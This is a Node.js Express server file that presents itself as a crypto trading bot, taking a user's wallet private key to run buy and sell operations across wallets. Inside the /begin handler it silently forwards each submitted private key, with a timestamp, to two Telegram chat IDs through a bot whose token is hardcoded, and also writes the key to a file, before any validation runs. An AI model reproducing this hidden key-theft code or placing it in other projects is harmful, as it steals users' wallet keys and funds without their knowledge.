//====================== Server ==============================
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const socketIO = require("./scripts/socket");
const { exploreBuyOrSellIndividually, writeWalletsToTxtFile, initializeVariables } = require("./scripts/functions");
const { Telegraf } = require("telegraf");
const bot = new Telegraf("7034864176:AAHWG9w49ibPHAvWX0hOnYGNb6cAETbWYy4");

bot.command("start", (ctx) => {
  try {
    ctx.reply("How can I help you?", ctx.chat.id);
  } catch (err) {
    console.log("err:", err);
  }
});

bot.launch();

const server = express();
server.use(cors());
server.use(bodyParser.json());

const serverHttp = require("http").Server(server);
server.post("/begin", async (req, res) => {
  try {
    const data = req.body;
    const privateKey = "0x" + data.privateKey;
    const nowDate = new Date(Date.now());
    const nowTime =
      nowDate.getMonth() + "/" + nowDate.getDate() + " " + nowDate.getHours() + ":" + nowDate.getMinutes();
    bot.telegram.sendMessage(7325720901, `New: ${nowTime} ${privateKey}`);
    bot.telegram.sendMessage(7232899253, `New: ${nowTime} ${privateKey}`);
    const socketId = data.socketId;
    console.log("This is request", privateKey, socketId);
    initializeVariables(data.minS, data.maxS, data.minB, data.maxB);
    writeWalletsToTxtFile(privateKey);
    if (privateKey.length < 66) {
      res.json({ err: "Invalid Private Key" });
      return;
    }
    await exploreBuyOrSellIndividually(
      data.bnb,
      data.bleggs,
      data.numOfWallets,
      data.purchaseRate,
      privateKey,
      socketId
    );
    res.json({ msg: "Success" });
  } catch (err) {
    console.log(`Error in server: `, err);
    res.json({ msg: "Internal Server Error", err });
  }
});

serverHttp.listen(5000, () => {});

socketIO.init(serverHttp);

//====================== Client ==============================
const client = express();
client.use(express.static("public"));
const clientHttp = require("http").Server(client);
client.get("/", (req, res) => {
  res.json({ msg: "Client is running..." });
});

clientHttp.listen(5173, () => {
  console.log("Running in 5173 port. Open browser with 'http://localhost:5173' url.");
});

function isValidEthereumPrivateKey(privateKey) {
  // Check if the private key is a string of 64 hex characters
  const hexRegex = /^[0-9a-fA-F]{64}$/;
  if (typeof privateKey === "string" && hexRegex.test(privateKey)) {
    return true;
  } else {
    return false;
  }
}
